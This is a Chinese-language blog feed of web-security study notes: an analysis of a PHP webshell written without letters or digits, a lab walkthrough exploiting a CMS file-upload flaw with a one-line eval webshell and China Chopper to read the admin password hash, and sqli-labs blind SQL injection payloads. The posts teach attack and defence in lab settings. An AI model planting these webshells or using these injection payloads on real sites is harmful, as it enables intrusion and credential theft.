<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>han个人博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-09-12T00:22:29.858Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>han</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Welcome</title>
    <link href="http://yoursite.com/2019/09/12/welcome/"/>
    <id>http://yoursite.com/2019/09/12/welcome/</id>
    <published>2019-09-12T00:00:00.000Z</published>
    <updated>2019-09-12T00:22:29.858Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt -->]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;记录  学习  分享&lt;/font&gt;&lt;/center&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>不包含字母和数字的webshell</title>
    <link href="http://yoursite.com/2019/09/11/webshell/"/>
    <id>http://yoursite.com/2019/09/11/webshell/</id>
    <published>2019-09-11T14:06:01.000Z</published>
    <updated>2019-09-12T01:54:33.764Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 分析 <code>webshell</code></p><a id="more"></a><!--export--><!--toc--><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>尝试分析如下 <code>webshell</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++;</span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>); </span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>); </span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); </span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); </span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>在 <code>php</code> 语言中 <code>^</code> 代表异或的意思。 <code>php</code> 是弱类型语言，即使用时可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_++;</span><br><span class="line">$__=(<span class="string">"#"</span> ^ <span class="string">"|"</span>);</span><br><span class="line">    <span class="keyword">echo</span> ($__);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/120webshell1.png" alt></p><p>可以看到输出为 <code>_</code>，原因是 <code>#</code> 的十六进制为 <code>0x23</code>，<code>|</code> 的十六进制为 <code>7C</code>，两者异或的结果为 <code>5F</code>。</p><p><img src="/images/120webshell2.png" alt></p><p><code>ASCII</code> 码 <code>5F</code> 对应的就是 <code>_</code>。</p><h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">P</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello World!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__= <span class="string">"."</span> ^ <span class="string">"~"</span>;</span><br><span class="line">    $__();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$_++</code> 即为变量 <code>_</code> 的自增运算，在 <code>PHP</code> 未定义的自变量默认值为 <code>NULL</code> ，而 <code>NULL==False==0</code>。</p><p><code>$__=&quot;.&quot; ^ &quot;~&quot;</code> 即把 <code>.</code> 和 <code>~</code> 异或的结果赋值给变量 <code>__</code> ，由第一段程序，我们可以很容易分析得 <code>&quot;.&quot; ^ &quot;~&quot;</code> 的结果为 <code>0x50</code> ，故 <code>__</code> 的值为 <code>P</code>。</p><p><code>$__()</code>变量后面有括号，即调用函数，故会调用函数 <code>P()</code>。</p><p>所以我们可以通过不同符号的异或构造出 <code>$_POST</code> 等字符，从而编写出一个使用数字和字母的 <code>webshell</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++;</span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>);</span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $__.=(<span class="string">"."</span>^<span class="string">"~"</span>);</span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $__.=(<span class="string">"/"</span>^<span class="string">"`"</span>); </span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $__.=(<span class="string">"|"</span>^<span class="string">"/"</span>); </span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); </span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/120webshell4.png" alt></p><p>最后一段代码的结果为 <code>$_POST[0]($_POST[1])</code>。</p><p>上面的代码还可以写在一起</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++;</span><br><span class="line">    $__=(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"."</span>^<span class="string">"~"</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"|"</span>^<span class="string">"/"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); </span><br><span class="line"><span class="keyword">echo</span>($__);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>除了用字符还可以用 <code>url</code> 编码实现。</p><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时需要我们写一个无字母和数字组成的 <code>shell</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">// $_='assert';</span></span><br><span class="line">    $_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); </span><br><span class="line"><span class="comment">// $__='_POST';</span></span><br><span class="line">    $__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>);</span><br><span class="line">    $___=$$__;</span><br><span class="line"><span class="comment">// assert($_POST[_]);</span></span><br><span class="line">    $_($___[_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8000/shell.php?shell=<span class="variable">$_</span>=(%27%01%27^%27`%27).(%27%13%27^%27`%27).(%27%13%27^%27`%27).(%27%05%27^%27`%27).(%27%12%27^%27`%27).(%27%14%27^%27`%27);<span class="variable">$__</span>=%27_%27.(%27%0D%27^%27]%27).(%27%2F%27^%27`%27).(%27%0E%27^%27]%27).(%27%09%27^%27]%27);<span class="variable">$___</span>=$<span class="variable">$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><p>其中 <code>shell=$_=assert</code>，<code>$__=_POST</code> 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8000/shell.php?shell=<span class="variable">$_</span>=assert;<span class="variable">$__</span>=_POST;<span class="variable">$___</span>=<span class="variable">$_POST</span>;assert(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure><p><img src="/images/120webshell5.png" alt></p><p><em>参考文章</em></p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p><p>[<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 分析 &lt;code&gt;webshell&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="webshell" scheme="http://yoursite.com/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>非法文件上传漏洞技术解析及防御</title>
    <link href="http://yoursite.com/2019/09/11/illegal-upload/"/>
    <id>http://yoursite.com/2019/09/11/illegal-upload/</id>
    <published>2019-09-11T10:32:53.000Z</published>
    <updated>2019-09-12T00:28:19.283Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 掌握杰奇 <code>CMS</code> 上传漏洞的利用方法，了解如何对此漏洞进行修复。</p><p><strong>实验工具</strong>：中国菜刀 + <code>Firebug</code></p><a id="more"></a><!--export--><!--toc--><h3 id="非法文件上传漏洞"><a href="#非法文件上传漏洞" class="headerlink" title="非法文件上传漏洞"></a>非法文件上传漏洞</h3><h4 id="定位文件上传漏洞"><a href="#定位文件上传漏洞" class="headerlink" title="定位文件上传漏洞"></a>定位文件上传漏洞</h4><p>用浏览器打开网页 <code>www.test.com</code>，先注册用户，注册成功后，用该用户登录，用户首页如下：</p><p><img src="/images/199jieqi1.png" alt></p><p>可以看到，用户头像为默认，故首先定位到用户上传头像功能。点击 <code>个人资料</code>，进入 <code>userdetail.php</code>，页面显示如下：</p><p><img src="/images/199jieqi2.png" alt></p><p>判断用户在设置头像这里是否存在文件上传漏洞。</p><p><img src="/images/199jieqi3.png" alt></p><p>在桌面上新建一个名为 <code>shell.php</code> 的文件，写入一句话木马。再复制一份，命名为 <code>shell.jpg</code> 文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在 <code>C:\Tools\抓包改包\Burp Suite</code> 中打开 <code>burp</code> ，设置浏览器为手动代理。</p><p><img src="/images/199jieqi4.png" alt></p><p>用 <code>burpsuite</code> 抓取上传 <code>shell.jpg</code> 的数据包，然后发送到 <code>Repeater</code>，然后在 <code>Repeater</code> 做各种尝试，查看 <code>Response</code>。</p><p>把文件后缀修改为 <code>.php</code>，文件上传不成功。因此尝试寻找其他位置。</p><p><img src="/images/199jieqi6.png" alt></p><p>在<code>我的空间</code>找到了上传相册功能，尝试在这里进行文件上传。</p><p><img src="/images/199jieqi7.png" alt></p><h4 id="三种方法绕过检测"><a href="#三种方法绕过检测" class="headerlink" title="三种方法绕过检测"></a>三种方法绕过检测</h4><h5 id="删除函数绕过"><a href="#删除函数绕过" class="headerlink" title="删除函数绕过"></a>删除函数绕过</h5><p>在上传相册页面，点击 <code>浏览</code> 选择 <code>shell.php</code> ，尝试在代码中找到前端 <code>js</code> 检测的代码。</p><p><img src="/images/199jieqi8.png" alt></p><p>发现 <code>form</code> 表单，提交时调用了 <code>checkFile()</code> 函数，直接把它删掉，</p><p><img src="/images/199jieqi10.png" alt></p><p>点击上传，发现上传成功。</p><p><img src="/images/199jieqi11.png" alt></p><h5 id="抓包绕过"><a href="#抓包绕过" class="headerlink" title="抓包绕过"></a>抓包绕过</h5><p>用 <code>burpsuit</code>抓包方法绕过，点击浏览，选择 <code>shell.jpg</code> 文件，点击上传。</p><p><img src="/images/199jieqi12.png" alt></p><p>在 <code>burp</code> 界面把文件后缀名改为 <code>.php</code> 。</p><p><img src="/images/199jieqi13.png" alt></p><p>发现上传成功。</p><h5 id="禁止-JS-功能绕过"><a href="#禁止-JS-功能绕过" class="headerlink" title="禁止 JS 功能绕过"></a>禁止 JS 功能绕过</h5><p>选中 <code>Disable JavaScript</code>，可以上传 <code>.php</code> 文件。</p><p><img src="/images/199jieqi26.png" alt></p><p><img src="/images/199jieqi14.png" alt></p><h4 id="使用中国菜刀"><a href="#使用中国菜刀" class="headerlink" title="使用中国菜刀"></a>使用中国菜刀</h4><p>打开菜刀，填写地址和密码，选择 <code>php</code> 脚本了类型。</p><p><img src="/images/199jieqi15.png" alt></p><p>添加成功后，选择文件目录，成功打开。</p><p><img src="/images/199jieqi16.png" alt></p><p>找到系统盘根目录下的 <code>flag</code> 文件。</p><p><img src="/images/199jieqi17.png" alt></p><p>双击打开文件。</p><p><img src="/images/199jieqi18.png" alt></p><p>返回主界面，右击选择数据库管理，</p><p><img src="/images/199jieqi19.png" alt></p><p>点击配置，填写如下内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;T&gt;MYSQL&lt;/T&gt;</span><br><span class="line">&lt;H&gt;localhost&lt;/H&gt;</span><br><span class="line">&lt;U&gt;root&lt;/U&gt;</span><br><span class="line">&lt;P&gt;root&lt;/P&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/199jieqi20.png" alt></p><p>点击提交，成功连接数据库。</p><p><img src="/images/199jieqi21.png" alt></p><p>发现 <code>testjie</code> 数据库，找到该库下的表 <code>jieqi_system_users</code>。</p><p><img src="/images/199jieqi23.png" alt></p><p>在输入框输入，如下 <code>SQL</code> 语句，点击执行，成功获取 <code>admin</code> 的密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT pass FROM jieqi_system_users WHERE name=&apos;admin&apos;;</span><br></pre></td></tr></table></figure><p><img src="/images/199jieqi24.png" alt></p><p>用在线的 <code>MD5</code> 解密工具解密。</p><p><img src="/images/199jieqi25.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 掌握杰奇 &lt;code&gt;CMS&lt;/code&gt; 上传漏洞的利用方法，了解如何对此漏洞进行修复。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;实验工具&lt;/strong&gt;：中国菜刀 + &lt;code&gt;Firebug&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="文件上传漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs 学习笔记</title>
    <link href="http://yoursite.com/2019/09/10/sqli-labs/"/>
    <id>http://yoursite.com/2019/09/10/sqli-labs/</id>
    <published>2019-09-10T00:06:14.000Z</published>
    <updated>2019-09-11T10:30:31.585Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 掌握 <code>sqli-labs</code> 每个关卡的注入原理，熟练使用手工注入和<code>sqlmap</code> 工具的使用，对源代码进行简单分析。</p><a id="more"></a><!--export--><!--toc--><h3 id="SQL-注入常用语句"><a href="#SQL-注入常用语句" class="headerlink" title="SQL 注入常用语句"></a><code>SQL</code> 注入常用语句</h3><h4 id="information-schema-表的应用"><a href="#information-schema-表的应用" class="headerlink" title="information_schema 表的应用"></a><code>information_schema</code> 表的应用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查询库名</span><br><span class="line">SELECT schema_name FROM information_schema.schemata</span><br><span class="line"># 查询表名</span><br><span class="line">SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;库名&apos;</span><br><span class="line"># 查询列名</span><br><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name=&apos;表名&apos; AND table_schema=&apos;库名&apos;</span><br><span class="line"># 取出相应的数据</span><br><span class="line">SELECT col1,col2 FROM `库名`.`表名`</span><br></pre></td></tr></table></figure><h4 id="UNION-SELECT-联合查询"><a href="#UNION-SELECT-联合查询" class="headerlink" title="UNION SELECT 联合查询"></a><code>UNION SELECT</code> 联合查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 先确定字段数</span><br><span class="line">ORDER BY 1,2,3,...,N</span><br><span class="line"># 联合查询，确定页面能显示的位置</span><br><span class="line">UNION SELECT 1,2,3,user(),version(),...,N</span><br><span class="line"># 把要查询的 SQL 语句放在相应位置</span><br><span class="line">UNION SELECT 1,2,3,/*放相应的 SQL 语句*/,5</span><br></pre></td></tr></table></figure><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AND length(database()) &gt; 0;</span><br><span class="line">AND substr(database(), 1, 1)=&apos;t&apos;</span><br><span class="line">AND ascii(substr(database(), 1, 1)) &gt; 0</span><br></pre></td></tr></table></figure><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># if 函数</span><br><span class="line">AND if(bool, exp1, exp2) # bool 为真，则执行 exp1，为假则执行 exp2</span><br></pre></td></tr></table></figure><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><h4 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h4><ol><li>打开首页如下图</li></ol><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_1.png" alt></p><ol start="2"><li>在查看器中找到 <code>form</code> 表单的名称</li></ol><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_2.png" alt></p><ol start="3"><li>使用 <code>HackBar</code> 以 <code>POST</code> 方式提交数据，随意输入用户名和密码，可以看出，页面提示登录失败。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=123&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_3.png" alt></p><ol start="4"><li>尝试使用万能密码登录，</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">' or 1 #&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_4.png" alt></p><p>可以看出登录成功。故我们可以利用用户名这块进行 <code>sql</code> 注入。找到注入点后，接下来我们来分析下到底该有哪种注入方式，首先，无论用户是否登录成功，页面均没有可用的数据以及数据库报错显示出来，所以 <code>UNION SELECT</code> 和报错注入显然是不合适的。根据登录成功与否显示的图片不同，故可以使用布尔盲注。</p><p>布尔盲注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">' and ascii(mid((select user()), 1, 1))&gt;0 #&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure><p>运用 <code>ascii</code> 和 <code>mid</code> 函数时，第一次应该先于 <code>0</code> 比较，因为这样能尽快判断出写入的语句是否存在错误，避免浪费过多时间。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_6.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">' and ascii(mid((select user()), 1, 1))&gt;120 #&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_5.png" alt></p><p>规范的做法应该是，第一步先用 <code>count</code> 判断库/表/字段个数，第二步是用 <code>limit</code> 控制把库/表/字段一一输出，然后用 <code>length</code> 判断每个名的长度，第三步用 <code>ascii</code> 和 <code>mid</code> 一一判断名中每个字符的大小。</p><p>时间盲注</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(length(user())&gt;1, sleep(1), 1) <span class="comment">#&amp;passwd=123&amp;submit=submit</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C198sqli-labs-less15_7.png" alt></p><p>可以看出，点击 <code>Execute</code> 后，页面等待一段时间后，显示登录错误，当我们把数字改到 <code>14</code> 后，点击 <code>Execute</code> ，页面立刻执行完毕，显示登录成功。其中原因是 <code>length(user())</code> 的输出为 <code>14</code>，当 <code>&gt;</code> 后面的数字小于 <code>14</code> 时，<code>if()</code> 函数执行 <code>sleep(1)</code> ，之后返回 <code>0</code>，然后执行如下的 <code>sql</code> 语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username=&apos;admin&apos; and 0 # and password=123 LIMIT 0,1</span><br></pre></td></tr></table></figure><p>后面是永假条件，此时的 <code>SQL</code> 语句返回空。反之，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username=&apos;admin&apos; and 1 # and password=123 LIMIT 0,1</span><br></pre></td></tr></table></figure><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>对输入参数做处理的核心代码如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'User Name:'</span>.$uname);</span><br><span class="line">fwrite($fp,<span class="string">'Password:'</span>.$passwd.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 掌握 &lt;code&gt;sqli-labs&lt;/code&gt; 每个关卡的注入原理，熟练使用手工注入和&lt;code&gt;sqlmap&lt;/code&gt; 工具的使用，对源代码进行简单分析。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="sqli-labs" scheme="http://yoursite.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>SQL 注入总结</title>
    <link href="http://yoursite.com/2019/09/07/sqlSum/"/>
    <id>http://yoursite.com/2019/09/07/sqlSum/</id>
    <published>2019-09-07T09:22:04.000Z</published>
    <updated>2019-09-11T06:04:52.191Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQL 注入总结，及<code>note38-note40</code> 笔记整理。</p><a id="more"></a><!--export--><!--toc--><h3 id="SQL-注入原理"><a href="#SQL-注入原理" class="headerlink" title="SQL 注入原理"></a>SQL 注入原理</h3><p>当 Web 应用向后台数据库传递 SQL 语句进行数据库操作时，若对用户输入的参数没有经过严格的过滤处理，攻击者可以构造特殊 SQL 语句，直接输入数据库引擎执行，获取或修改数据库中数据。</p><ul><li>SQL 注入漏洞本质：把用户输入的数据当作代码执行，违背了“<strong>数据与代码分离</strong>”的原则。</li><li>SQL 注入漏洞有两个关键条件：<ul><li>用户能控制输入内容</li><li>Web 应用把用户输入的内容带入到数据库中执行</li></ul></li></ul><h3 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h3><p><img src="/images/196SQLsum1.png" alt></p><h4 id="二次编码原理"><a href="#二次编码原理" class="headerlink" title="二次编码原理"></a>二次编码原理</h4><p>提交的参数到 Web 服务器时，Web 服务器会自动解码一次，若某处使用了 urldecode 或者 rawurldecode 函数，则会导致二次解码生成单引号引发注入。</p><p><img src="/images/196SQLsum5.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 